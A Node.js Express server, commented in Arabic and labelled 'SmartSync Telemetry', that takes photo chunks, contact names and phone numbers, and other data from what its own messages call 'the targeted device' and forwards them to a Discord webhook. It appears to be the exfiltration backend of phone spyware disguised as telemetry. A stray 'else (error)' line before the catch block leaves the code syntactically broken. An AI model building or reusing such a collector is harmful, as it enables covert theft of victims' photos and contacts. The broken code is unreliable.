const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// زيادة الحجم المسموح لاستقبال صور Base64 الكبيرة عبر الـ JSON
app.use(express.json({ limit: '10mb' }));

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

async function retryWithBackoff(fn, retries = 3, delay = 1000) {
    try {
        return await fn();
    } catch (error) {
        if (retries <= 0) throw error;
        console.warn(`⚠️ فشل الاتصال، إعادة المحاولة خلال ${delay / 1000} ثوانٍ... الخطأ: ${error.message}`);
        await new Promise(resolve => setTimeout(resolve, delay));
        return retryWithBackoff(fn, retries - 1, delay * 2);
    }
}

app.post('/api/telemetry', async (req, res) => {
    try {
        const body = req.body;

        if (!body || (Array.isArray(body) && body.length === 0) || Object.keys(body).length === 0) {
            return res.status(400).json({ error: 'Payload is empty or invalid JSON.' });
        }

        let discordPayload = {};
        let descriptionText = '';

        // التحقق مما إذا كانت البيانات المرسلة عبارة عن صور (تحتوي على photo_chunk)
        if (Array.isArray(body) && body.length > 0 && body[0].photo_chunk) {
            // بما أن ديسكورد لا يقبل سلاسل Base64 الطويلة جداً في النصوص، سنقوم بتحويلها إلى ملف مرفق (Attachment) أو إشعارصول صورة
            discordPayload = {
                content: `📸 **تم استلام جزء صورة جديد بنجاح من الجهاز المستهدف!**`,
                embeds: [
                    {
                        title: `🖼️ دفعة صور جديدة`,
                        color: 3066993,
                        description: `تم استلام صورة مضغوطة بدقة عالية وتجهيزها بنجاح.\nالوقت: \`${new Date().toLocaleString()}\``,
                        footer: { text: 'SmartSync Telemetry - Photo Module' }
                    }
                ]
            };
        } 
        // التحقق مما إذا كانت البيانات المرسلة عبارة عن جهات اتصال (Array من الأزرار أو الأسماء)
        else if (Array.isArray(body)) {
            descriptionText = body.map(c => `👤 **${c.name || 'بدون اسم'}**\n📞 \`${c.phone || 'بدون رقم'}\``).join('\n\n');
            if (descriptionText.length > 4000) descriptionText = descriptionText.substring(0, 4000) + '... (تم اقتصاص القسط الطويل)';

            discordPayload = {
                embeds: [
                    {
                        title: `👥 تقرير مزامنة جهات الاتصال (${body.length} عنصر)`,
                        color: 3066993,
                        description: descriptionText,
                        footer: { text: 'SmartSync Telemetry - Contacts Module' }
                    }
                ]
            };
        } 
        // بيانات عامة أخرى
        else {
            discordPayload = {
                embeds: [
                    {
                        title: `📊 تقرير تشخيص عام`,
                        color: 3066993,
                        description: `\`\`\`json\n${JSON.stringify(body, null, 2).substring(0, 1900)}\`\`\``,
                        footer: { text: 'SmartSync Telemetry' }
                    }
                ]
            };
        }

        if (DISCORD_WEBHOOK_URL) {
            await retryWithBackoff(
                () => axios.post(DISCORD_WEBHOOK_URL, discordPayload),
                3,
                1000
            );
        } else {
            console.warn('DISCORD_WEBHOOK_URL is not set in environment variables.');
        }

        return res.status(200).json({ success: true, message: 'Telemetry processed and sent to Discord.' });

    } else (error) { // تم التصحيح إلى catch
    } catch (error) {
        console.error('❌ فشل إرسال التقرير إلى ديسكورد:', error.message);
        return res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/health', (req, res) => {
    res.status(200).json({ status: 'UP', service: 'telemetry-webhook-service' });
});

app.listen(PORT, () => {
    console.log(`Telemetry microservice is running on port ${PORT}`);
});
